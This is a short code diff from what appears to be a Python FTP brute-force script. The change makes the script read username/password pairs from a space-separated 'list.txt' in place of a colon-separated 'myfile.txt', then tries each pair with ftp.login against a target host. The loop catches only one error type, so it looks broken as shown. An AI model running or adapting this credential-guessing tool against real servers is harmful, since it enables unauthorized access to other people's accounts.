@@ -61,9 +61,9 @@ brute= options.brute
 def brute(host):
     try:
         ftp = FTP(host)
-        with open('myfile.txt') as f:
-            credentials = [x.strip().split(':') for x in f.readlines()]
-        for username,password in credentials:
+        with open('list.txt') as f:
+            data = [x.strip().split(' ') for x in f.readlines()]
+        for username,password in data:
             print username, password
             ftp.login(username,password)
     except ftplib.error_reply:
